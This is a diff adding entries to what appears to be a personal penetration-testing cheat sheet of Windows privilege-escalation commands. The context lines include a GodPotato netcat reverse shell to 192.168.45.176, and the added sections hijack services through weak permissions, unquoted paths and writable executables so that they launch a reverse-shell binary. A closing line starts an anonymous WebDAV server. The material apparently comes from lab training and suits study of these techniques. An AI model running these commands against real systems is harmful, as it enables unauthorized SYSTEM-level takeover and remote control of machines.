@@ -1130,5 +1130,61 @@ GodPotato -cmd "cmd /c whoami"
 GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.176 7777"
 ```
 
+### Windows Privesc: Insecure Service Permissions
+```bash
+# Check if we can modify the "daclsvc" service
+.\accesschk.exe /accepteula -uwcqv user daclsvc
+# Check the current configuration of the service
+sc qc daclsvc
+# Check currnet status of the service
+sc query daclsvc
+# Reconfigure the service to use our reverse shell executable
+sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+# Start a listener on Kali then start the service to trigger the exploit
+net start daclsvc
+```
+
+### Windows Privesc: Unquoted Service Path
+```bash
+# Run winPEAS to check for service misconfigurations
+.\winPEASany.exe quiet servicesinfo
+# Confirm this using sc
+sc qc unquotedsvc
+# Use accesschk.exe to check for write permissions:
+.\accesschk.exe /accepteula -uwdq C:\
+.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
+.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+# Copy the reverse shell executable and rename it appropriately
+copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+# Start a listener on Kali, and then start the service to trigger the exploit
+net start unquotedsvc
+```
+
+### Windows Privesc: Insecure Service Executables
+```bash
+# Run winPEAS to check for service misconfigurations
+.\winPEASany.exe quiet servicesinfo
+# Note that the “filepermsvc” service has an executable which appears to be writable by everyone. We can confirm this with accesschk.exe
+.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+# Create a backup of the original service executable
+copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
+# Copy the reverse shell executable to overwrite the service executable
+copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+# Start a listener on Kali, and then start the service to trigger the exploit
+net start filepermsvc
+```
+
+
+
+
+###wsgi
+```bash
+/usr/local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /root/webdav
+```
+
+
+
+
+
 
 
